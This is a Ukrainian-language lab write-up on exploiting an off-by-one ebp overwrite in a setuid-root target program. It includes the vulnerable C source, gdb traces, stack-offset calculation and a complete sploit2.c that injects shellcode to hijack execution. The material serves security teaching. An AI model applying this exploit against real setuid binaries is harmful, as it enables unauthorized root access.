# Buffer overflow of ebp

Розглянемо /proj1/targets/target2.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  /* 
  Функція strncpy перевіряє довжину аргументу ( у in strncpy )
  У рядку, та функція ( strncpy ) стежить за тим, щоб довжина
  in не перевищувала довжину out. Таким чином, копіювання
  сподівається не перевищувати довжину buf (buf [200]) (buf
  виведено у функції strncpy).
  */

 

  len = strlen(in);
  if (len > outl)
    len = outl;

  /*
  Помилка в коді знаходиться в наступному циклі. Має бути 
  i<len, або копіювання буде включати на один байт більше,
  якщо довжина перевищує кількість out. 
  */

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}

void bar(char *arg)
{
  char buf[200];

  nstrcpy(buf, sizeof buf, arg);
}

void foo(char *argv[])
{
  bar(argv[1]);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target2: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```

_‌Лістинг 1: Вихідний код нашої програми target2.c для використання переповнення буфера._

За однобайтового переповнення ми не можемо змінити значення збереження eip у стеку. Але можемо змінити перший байт ebp. Отже можемо змінити його значення на діапазоні 0xbffffd\*\*.

Дизасемлуємо функцію bar в spoit2:

```text
(gdb) disas bar
Dump of assembler code for function bar:
   0x0804851a <+0>: push   %ebp
   0x0804851b <+1>: mov    %esp,%ebp
   0x0804851d <+3>: sub    $0xc8,%esp
   0x08048523 <+9>: pushl  0x8(%ebp)
   0x08048526 <+12>:    push   $0xc8
   0x0804852b <+17>:    lea    -0xc8(%ebp),%eax
   0x08048531 <+23>:    push   %eax
   0x08048532 <+24>:    call   0x80484cb <nstrcpy>
   0x08048537 <+29>:    add    $0xc,%esp
   0x0804853a <+32>:    nop
   0x0804853b <+33>:    leave  
   0x0804853c <+34>:    ret    
End of assembler dump.
```

_‌Лістинг 2: Дизасемльована функція bar_

Після того, як ми пошкодили ebp програми переповненням, в кінці виконується інструкція bar+33 leave інструкція.

```text
leave = mov esp, ebp; 
        pop ebp // ebp зіпсований
```

_‌Лістинг 3: інструкція leave_

Пошкоджене значення знаходиться у реєстрі ebp. Програма повернеться до функції foo:

```text
(gdb) disas foo
Dump of assembler code for function foo:
   0x0804853d <+0>: push   %ebp
   0x0804853e <+1>: mov    %esp,%ebp
   0x08048540 <+3>: mov    0x8(%ebp),%eax
   0x08048543 <+6>: add    $0x4,%eax
   0x08048546 <+9>: mov    (%eax),%eax
   0x08048548 <+11>:    push   %eax
   0x08048549 <+12>:    call   0x804851a <bar>
   0x0804854e <+17>:    add    $0x4,%esp
   0x08048551 <+20>:    nop
   0x08048552 <+21>:    leave  
   0x08048553 <+22>:    ret    
End of assembler dump.
```

_‌Лістинг 4: Дизасемльована функція foo_

Коли 0x08048552 &lt;+21&gt;: leave зпроцює mov esp,ebp //ebp зіпсований Отже, тепер наш пошкоджений ebp переміщується в esp, який змінює верх стека на довільне місце, а потім ret викликає eip, що вказує на довільну адресу.

Заполним буфер змінної buf 150 разів:

```c
int main (void)
{
  char buf[208];
  int i;

  for(i = 0; i < 150; i++) {
    *(buf + i) = 'A';
  }

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

_‌Лістинг 5: sploit2.c для використання заповнення буфера._

Та подивимось орігінальний ebp:

```bash
gdb -e sploit2 -s /tmp/target2
(gdb) catch exec
(gdb) run 
(gdb) break *bar+33
Breakpoint 2 at 0x804853b: file target2.c, line 23.
(gdb) continue
Continuing.
Breakpoint 2, 0x0804853b in bar (arg=0xbfffff55 'A' <repeats 150 times>, "\377\377/") at target2.c:23
23  }
(gdb) x/x $ebp
0xbffffdc0: 0xbffffdcc
```

_‌Лістинг 6: gdb перегляд ebp_

Тепер заповнем 202 раза:

```c
int main (void)
{
  char buf[208];
  int i;

  for(i = 0; i < 202; i++) {
    *(buf + i) = 'A';
  }

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

_‌Лістинг 7: sploit2.c для використання переповнення буфера._

Та подивимось зміненний ebp:

```bash
gdb -e sploit2 -s /tmp/target2
(gdb) catch exec
(gdb) run
(gdb) break *bar+33
Breakpoint 2 at 0x804853b: file target2.c, line 23.
(gdb) continue
Continuing.
Breakpoint 2, 0x0804853b in bar (arg=0xbfffff1e 'A' <repeats 200 times>...) at target2.c:23
23  }
(gdb) x/x $ebp
0xbffffd90: 0xbffffd41
(gdb) x buf
0xbffffcc8: 0x41414141
```

_‌Лістинг 8: gdb перегляд ebp_

Отже переписали младший байт ebp 0xbffffdcc -&gt; 0xbffffd41. Розташування стека 0xbffffd41 є частиною буфера призначення ‘buf’, і оскільки введення користувача копіюється в цей буфер призначення, зловмисник має контроль над цим розташуванням стека \(0xbffffd41\) і, отже, він має контроль над покажчиком інструкцій \(eip\), використовуючи який він може досягти довільного виконання коду. Давайте перевіримо це

```bash
(gdb) break *foo+22
Breakpoint 2 at 0x8048553: file target2.c, line 28.
(gdb) continue
Continuing.
Breakpoint 2, 0x08048553 in foo (argv=0x41414141) at target2.c:28
28  }
(gdb) x/x $esp
0xbffffd45: 0x41414141
```

_‌Лістинг 9: gdb перегляд esp_

Ми бачемо що верх стеку змінено \($esp\). $esp перезаписали нашим зміненим ebp. 0xbffffd45+4 буде отримано eip.

```bash
(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x $eip
0x41414141: Cannot access memory at address 0x41414141
```

_‌Лістинг 10: gdb перегляд eip_

Бачемо, що ми маємо контроль над покажчиком інструкцій \(EIP\) через перезапис EBP.

**Разберемось чому так…**

* 0x08048532 bar&lt;+24&gt;: call strcpy - Це виконання інструкції призводить до переповнення окремо, отже, значення EBP foo \(зберігається в розташуванні стека 0xbffffdc0\) змінюється з 0xbffffdcc на 0xbffffd41.
* 0x0804853b bar&lt;+33&gt;:leave - інструкція залишити розмотує простір стека цієї функції та відновлює ebp

```text
leave: mov ebp, esp;        //esp = ebp = 0xbffffdcc
       pop ebp;             //ebp = 0xbffffd41
```

_‌Лістинг 11: інструкція leave_

* 0x0804853c bar&lt;+34&gt;: ret Повертається до інструкції foo 0x08048552
* 0x08048552 foo&lt;+21&gt;: leave нструкція розмотує простір стека цієї функції та відновлює ebp.

```text
leave: mov ebp, esp;        //esp = ebp = 0xbffffd41 (Частина розмотування esp зміщується вниз, а не вгору !!)
       pop ebp;             //ebp = 0x41414141; esp = 0xbffffd45
```

_‌Лістинг 12: інструкція leave_

* 0x08048553 fooo&lt;+22&gt;: ret - Повернення до інструкції, розташованої на ESP \(0xbffffd45\). Тепер ESP вказує на контрольований зловмисником буфер, а отже, зловмисник може повернутися в будь-яке місце, де хоче досягти довільного виконання коду.

Тепер давайте знайдемо, на якому відстані від початку буфера призначення ‘buf’, нам потрібно розмістити нашу зворотну адресу. Пам’ятайте, що при уразливості, яка не є однією, ми не перезаписуємо фактичну адресу повернення, що зберігається в стеці \(як це робиться в переповненнях буфера на основі стеку\), замість цього 4-байтова область пам’яті всередині буфера призначення контрольованого зловмисником buf буде розглядатися як розташування адреси повернення \(після переповнення окремо\). Таким чином, нам потрібно знайти зміщення цього місця повернення адреси \(від ‘buf’\), яке є частиною самого буфера призначення ‘buf’. buf знаходиться за адресою 0xbffffcc8, і після виконання процесора ми знаємо, що адреса зворотної адреси всередині буфера призначення ‘buf’ знаходиться за адресою 0xbffffd45. Отже, зміщення offset для повернення адреси з ‘buf’ становить 0xbffffd45–0xbffffcc8 = 0x7D = 125.

```text
   ^ +-----------+
ebp| |  2 bytes  |
   V +-----------+
   ^
   |
   |      NOP
   |
   | +------------+
   | |  fake EIP  |
   | +------------+
   |               ^
buf|       NOP     |
200| +------------+|
   | |            || 125 offset
   | | Shellcode  || 
   | |            ||
   V +------------+V
```

Для спрощення замість NOP можно вставити адресс fake EIP.

Пишемо sploit2.c:

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main (void)
{
  char buf[208];
  long RET, *p;
  int i;

  RET = 0xbffffcc8;

  p = (long *) buf;
  for (i = 0; i < 208; i += 4)
    *(p++) = RET;

  buf[208 - 8] = 0x60;

  memcpy (buf, shellcode, strlen (shellcode));

  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```

_‌Лістинг 13: sploit2.c для використання переповнення буфера._

